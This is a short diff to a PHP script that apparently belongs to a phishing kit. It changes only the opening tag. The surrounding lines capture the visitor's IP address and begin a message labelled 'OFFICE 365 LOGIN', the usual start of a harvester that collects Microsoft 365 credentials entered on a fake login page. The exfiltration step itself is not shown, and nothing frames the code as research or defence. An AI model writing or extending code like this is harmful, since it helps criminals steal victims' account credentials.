@@ -1,4 +1,4 @@
-<?
+<?php
 
 $ip = getenv("REMOTE_ADDR");
 $message .= "--------------OFFICE 365 LOGIN---------------------\n";
